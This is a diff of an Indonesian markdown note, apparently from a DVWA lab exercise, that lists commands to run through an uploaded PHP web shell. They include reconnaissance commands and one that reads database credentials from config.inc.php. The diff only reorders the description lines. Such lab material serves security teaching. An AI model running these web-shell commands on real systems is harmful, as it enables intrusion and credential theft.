@@ -17,23 +17,23 @@ http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=
 ## contoh "http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=whoami" berarti melihat user
 ## penjelasan perintah
 ### Command	Fungsi
+lihat user sat ini
 ```bash
 whoami
 ```
-Lihat user saat ini
+Lihat konfigurasi ip
 ```bash
 ipconfig
 ```	
-Lihat konfigurasi IP
+list isi drive c
 ```bash
 dir C:\
 ```	
-List isi drive C
+baca kredensial database
 ```bash
 type ..\..\config\config.inc.php
 ```
-Baca kredensial database
+informasi sistem lengkap
 ```bash
 systeminfo
 ```	
-Informasi sistem lengkap
